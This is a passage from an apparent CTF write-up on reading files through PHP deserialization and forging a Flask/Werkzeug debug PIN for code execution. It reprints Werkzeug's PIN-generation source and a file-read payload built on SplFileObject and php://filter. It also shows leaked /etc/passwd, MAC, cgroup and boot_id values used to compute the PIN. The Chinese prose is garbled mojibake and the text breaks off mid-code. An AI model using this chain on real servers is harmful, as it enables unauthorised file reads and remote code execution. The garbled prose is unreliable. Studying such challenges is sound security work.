class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> <span class="operator">=</span> array(</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;SplFileObject&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;properties&#x27;</span> =&gt; array(<span class="string">&quot;php://filter/convert.base64-encode/resource=/usr/lib/python3.8/site-packages/flask/app.py&quot;</span>,<span class="string">&quot;r&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$serialized_data = serialize($data);</span><br><span class="line">$a=unserialize($serialized_data);</span><br><span class="line">var_dump($a);</span><br><span class="line">echo $serialized_data;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2000è¡Œä»£ç ï¼Œææ€–å¦‚æ–¯ã€‚</p><h1 id="ç®—pinç "><span id="ç®—pinç "> ç®—pinç </span></h1><p>werkzurg/debug/init.py<br>å¬å¸ˆå‚…è¯´è¿™é“é¢˜æœ‰ç®—pinç çš„æ“ä½œï¼Œè¶ç€è¿™ä¸ªæœºä¼šï¼ŒæŠŠç®—pinå…ˆå­¦ä¸€ä¸‹ã€‚<br>ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯flaskå¼€å¯äº†debugæ¨¡å¼ï¼Œä¼šç”Ÿæˆä¸€ä¸ªå¯†ç ï¼Œä½¿ç”¨è¿™ä¸ªå¯†ç å°±èƒ½ä»»æ„ä»£ç æ‰§è¡Œäº†ã€‚<br>è€Œè¿™ä¸ªç”Ÿæˆpinç ä¹Ÿæœ‰ä¸ªæµç¨‹ï¼Œå¯ä»¥åœ¨pycahrmçš„æºç åˆ†æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">pin</span><span class="params">(self)</span> -&gt; t.Optional[str]:</span><br><span class="line">       <span class="keyword">if</span> not <span class="title function_">hasattr</span><span class="params">(self, <span class="string">&quot;_pin&quot;</span>)</span>:</span><br><span class="line">           pin_cookie = get_pin_and_cookie_name(self.app)</span><br><span class="line">           self._pin, self._pin_cookie = pin_cookie  # type: ignore</span><br><span class="line">       <span class="keyword">return</span> self._pin</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">get_pin_and_cookie_name</span><span class="params">(</span></span><br><span class="line"><span class="params">    app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params">)</span> -&gt; t.Union[t.Tuple[str, str], t.Tuple[None, None]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="type">None</span></span><br><span class="line">    <span class="variable">num</span> <span class="operator">=</span> None</span><br><span class="line"></span><br><span class="line">    # Pin was explicitly disabled</span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> None, None</span><br><span class="line"></span><br><span class="line">    # Pin was provided explicitly</span><br><span class="line">    <span class="keyword">if</span> pin is not None and pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdecimal():</span><br><span class="line">        # If there are separators in the pin, <span class="keyword">return</span> it directly</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> in pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = <span class="type">pin</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">modname</span> <span class="operator">=</span> getattr(app, <span class="string">&quot;__module__&quot;</span>, t.cast(object, app).__class__.__module__)</span><br><span class="line">    username: t.Optional[str]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        # getuser imports the pwd <span class="keyword">module</span>, which does not exist in Google</span><br><span class="line">        # App Engine. It may also raise a KeyError <span class="keyword">if</span> the UID does not</span><br><span class="line">        # have a username, such as in Docker.</span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    except (ImportError, KeyError):</span><br><span class="line">        username = <span class="type">None</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">mod</span> <span class="operator">=</span> sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    # This information only exists to make the cookie unique on the</span><br><span class="line">    # computer, not as a security feature.</span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        getattr(app, <span class="string">&quot;__name__&quot;</span>, type(app).__name__),</span><br><span class="line">        getattr(mod, <span class="string">&quot;__file__&quot;</span>, None),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    # This information is here to make it harder <span class="keyword">for</span> an attacker to</span><br><span class="line">    # guess the cookie name.  They are unlikely to be contained anywhere</span><br><span class="line">    # within the unauthenticated debug page.</span><br><span class="line">    private_bits = [str(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit in <span class="title function_">chain</span><span class="params">(probably_public_bits, private_bits)</span>:</span><br><span class="line">        <span class="keyword">if</span> not bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">isinstance</span><span class="params">(bit, str)</span>:</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(b<span class="string">&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = f<span class="string">&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    # If we need to generate a pin we salt it a bit more so that we don<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">    # end up with the same value and generate out 9 digits</span></span><br><span class="line"><span class="string">    if num is None:</span></span><br><span class="line"><span class="string">        h.update(b&quot;pinsalt&quot;)</span></span><br><span class="line"><span class="string">        num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="string">    # we don&#x27;</span>t have a result yet.</span><br><span class="line">    <span class="keyword">if</span> rv is None:</span><br><span class="line">        <span class="keyword">for</span> group_size in <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="title function_">len</span><span class="params">(num)</span> % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(num)</span>, group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure><p>rvå°±æ˜¯pinç <br>é‡ç‚¹çœ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> bit in <span class="title function_">chain</span><span class="params">(probably_public_bits, private_bits)</span>:</span><br><span class="line">    <span class="keyword">if</span> not bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span><span class="params">(bit, str)</span>:</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b<span class="string">&quot;cookiesalt&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¼•å…¥äº†ä¸¤å¼ è¡¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        getattr(app, <span class="string">&quot;__name__&quot;</span>, type(app).__name__),</span><br><span class="line">        getattr(mod, <span class="string">&quot;__file__&quot;</span>, None),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private_bits = [str(uuid.getnode()), get_machine_id()]</span><br></pre></td></tr></table></figure><p>ç»“åˆdebugçš„å˜é‡ä¿¡æ¯åšåˆ†æ<br>usernameå°±æ˜¯å¯åŠ¨flaskçš„ç”¨æˆ·ã€‚<br>modnaneä¸€èˆ¬ä¸ºflask.app<br>getattr(app, â€˜<strong>name</strong>â€™, getattr(app.<strong>class</strong>, â€˜<strong>name</strong>â€™))ä¸ºFlask.<br>getattr(mod, â€˜<strong>file</strong>â€™, None)ä¸ºflaskç›®å½•ä¸‹çš„ä¸€ä¸ªapp.pyçš„ç»å¯¹è·¯å¾„.<br>uuid.getnode()å°±æ˜¯å½“å‰ç”µè„‘çš„MACåœ°å€ï¼Œstr(uuid.getnode())åˆ™æ˜¯macåœ°å€çš„åè¿›åˆ¶è¡¨è¾¾å¼ã€‚<br>getmachine_id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_machine_id</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _machine_id</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">            linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">                <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">        <span class="comment"># relatively stable across boots.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> linux:</span><br><span class="line">            <span class="keyword">return</span> linux</span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X, use ioreg to get the computer&#x27;s serial number.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># subprocess may not be available, e.g. Google App Engine</span></span><br><span class="line">            <span class="comment"># https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">            dump = Popen(</span><br><span class="line">                [<span class="string">&quot;ioreg&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;IOPlatformExpertDevice&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;2&quot;</span>], stdout=PIPE</span><br><span class="line">            ).communicate()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows, use winreg to get the machine guid.</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&quot;win32&quot;</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> winreg.OpenKey(</span><br><span class="line">                    winreg.HKEY_LOCAL_MACHINE,</span><br><span class="line">                    <span class="string">&quot;SOFTWARE\\Microsoft\\Cryptography&quot;</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,</span><br><span class="line">                ) <span class="keyword">as</span> rk:</span><br><span class="line">                    guid: t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]</span><br><span class="line">                    guid_type: <span class="built_in">int</span></span><br><span class="line">                    guid, guid_type = winreg.QueryValueEx(rk, <span class="string">&quot;MachineGuid&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> guid_type == winreg.REG_SZ:</span><br><span class="line">                        <span class="keyword">return</span> guid.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> guid</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    _machine_id = _generate()</span><br><span class="line">    <span class="keyword">return</span> _machine_id</span><br></pre></td></tr></table></figure><p>ä¼šè¯»etc/machineæˆ–/proc/sys/kernel/random/boot_içš„å€¼ï¼Œç„¶åè¿˜ä¼šè¯»/proc/self/cgroupé‡Œé¢çš„å†…å®¹ã€‚äºŒè€…è¿›è¡Œä¸€ä¸ªæ‹¼æ¥ã€‚</p><h2 id="ctfshow801"><span id="ctfshow801"> ctfshow801</span></h2><p>é€šè¿‡è¯»å„ç§æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/local/lib/python3<span class="number">.8</span>/site-packages/flask/app.py</span><br><span class="line"><span class="number">2485377569947</span></span><br><span class="line">26657bfd-2d70-45fa-97b3-99462feda8931a000beba489f5f923a435f4066ef2d5c61bc5f772d82f2f4e2905e2bf62a346</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">986</span>-<span class="number">811</span>-<span class="number">716</span></span><br><span class="line">__wzd572dec175b8e0289b637</span><br></pre></td></tr></table></figure><h2 id="å›åˆ°é¢˜ç›®"><span id="å›åˆ°é¢˜ç›®"> å›åˆ°é¢˜ç›®</span></h2><p>å¼€å§‹æ’¸ä¿¡æ¯ã€‚<br>è¯»etc/passwd,ä¸€èˆ¬ç”¨æˆ·ä¿¡æ¯éƒ½ä¼šå­˜å‚¨åœ¨è¿™é‡Œ<br>/etc/shadow: è¿™ä¸ªæ–‡ä»¶å­˜å‚¨äº†ç”¨æˆ·çš„åŠ å¯†å¯†ç å’Œå¯†ç ç›¸å…³çš„ä¿¡æ¯ï¼Œå¦‚å¯†ç å“ˆå¸Œå€¼ã€å¯†ç è¿‡æœŸæ—¶é—´ã€è´¦æˆ·é”å®šçŠ¶æ€ç­‰ã€‚ç”±äºåŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œé€šå¸¸åªæœ‰ç‰¹æƒç”¨æˆ·ï¼ˆå¦‚rootï¼‰æ‰èƒ½è¯»å–å’Œä¿®æ”¹è¯¥æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/ash</span><br><span class="line"><span class="built_in">bin</span>:x:<span class="number">1</span>:<span class="number">1</span>:<span class="built_in">bin</span>:/<span class="built_in">bin</span>:/sbin/nologin</span><br><span class="line">daemon:x:<span class="number">2</span>:<span class="number">2</span>:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:<span class="number">3</span>:<span class="number">4</span>:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:<span class="number">4</span>:<span class="number">7</span>:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:<span class="number">5</span>:<span class="number">0</span>:sync:/sbin:/<span class="built_in">bin</span>/sync</span><br><span class="line">shutdown:x:<span class="number">6</span>:<span class="number">0</span>:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:<span class="number">7</span>:<span class="number">0</span>:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:<span class="number">8</span>:<span class="number">12</span>:mail:/var/mail:/sbin/nologin</span><br><span class="line">news:x:<span class="number">9</span>:<span class="number">13</span>:news:/usr/lib/news:/sbin/nologin</span><br><span class="line">uucp:x:<span class="number">10</span>:<span class="number">14</span>:uucp:/var/spool/uucppublic:/sbin/nologin</span><br><span class="line">operator:x:<span class="number">11</span>:<span class="number">0</span>:operator:/root:/sbin/nologin</span><br><span class="line">man:x:<span class="number">13</span>:<span class="number">15</span>:man:/usr/man:/sbin/nologin</span><br><span class="line">postmaster:x:<span class="number">14</span>:<span class="number">12</span>:postmaster:/var/mail:/sbin/nologin</span><br><span class="line">cron:x:<span class="number">16</span>:<span class="number">16</span>:cron:/var/spool/cron:/sbin/nologin</span><br><span class="line">ftp:x:<span class="number">21</span>:<span class="number">21</span>::/var/lib/ftp:/sbin/nologin</span><br><span class="line">sshd:x:<span class="number">22</span>:<span class="number">22</span>:sshd:/dev/null:/sbin/nologin</span><br><span class="line">at:x:<span class="number">25</span>:<span class="number">25</span>:at:/var/spool/cron/atjobs:/sbin/nologin</span><br><span class="line">squid:x:<span class="number">31</span>:<span class="number">31</span>:Squid:/var/cache/squid:/sbin/nologin</span><br><span class="line">xfs:x:<span class="number">33</span>:<span class="number">33</span>:X Font Server:/etc/X11/fs:/sbin/nologin</span><br><span class="line">games:x:<span class="number">35</span>:<span class="number">35</span>:games:/usr/games:/sbin/nologin</span><br><span class="line">cyrus:x:<span class="number">85</span>:<span class="number">12</span>::/usr/cyrus:/sbin/nologin</span><br><span class="line">vpopmail:x:<span class="number">89</span>:<span class="number">89</span>::/var/vpopmail:/sbin/nologin</span><br><span class="line">ntp:x:<span class="number">123</span>:<span class="number">123</span>:NTP:/var/empty:/sbin/nologin</span><br><span class="line">smmsp:x:<span class="number">209</span>:<span class="number">209</span>:smmsp:/var/spool/mqueue:/sbin/nologin</span><br><span class="line">guest:x:<span class="number">405</span>:<span class="number">100</span>:guest:/dev/null:/sbin/nologin</span><br><span class="line">nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/:/sbin/nologin</span><br><span class="line">catchlog:x:<span class="number">100</span>:<span class="number">101</span>:catchlog:/:/<span class="built_in">bin</span>/false</span><br><span class="line">apache:x:<span class="number">1000</span>:<span class="number">1000</span>::/srv/www:/<span class="built_in">bin</span>/bash</span><br><span class="line">app:x:<span class="number">1001</span>:<span class="number">1001</span>::/home/app:/<span class="built_in">bin</span>/ash</span><br></pre></td></tr></table></figure><p>è¯»/sys/class/net/eth0/address</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:<span class="number">42</span>:ac:<span class="number">13</span>:<span class="number">00</span>:02</span><br><span class="line"><span class="number">2485378023426</span></span><br></pre></td></tr></table></figure><p>è½¬ä¸ªåå…­è¿›åˆ¶ã€‚<br>è¯»/proc/self/cgroup</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span>:devices:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">11</span>:net_cls,net_prio:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">10</span>:rdma:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">9</span>:memory:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">8</span>:freezer:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">7</span>:cpu,cpuacct:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">6</span>:hugetlb:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">5</span>:perf_event:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">4</span>:blkio:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">3</span>:cpuset:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">2</span>:pids:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">1</span>:name=systemd:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">0</span>::/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br></pre></td></tr></table></figure><p>è¯»/proc/sys/kernel/random/boot_id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">349b3354-f67f-<span class="number">4438</span>-b395-4fbc01171fdd</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">        <span class="string">&quot;app&quot;</span>,<span class="comment">#/etc/passwd</span></span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,<span class="comment">#é»˜è®¤</span></span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,<span class="comment">#é»˜è®¤</span></span><br><span class="line">        <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span> ,<span class="comment">#ä¸€ä¸ªè·¯å¾„ä¿¡æ¯</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;2485378023426&quot;</span>, <span class="comment">#/sys/class/net/eth0/address 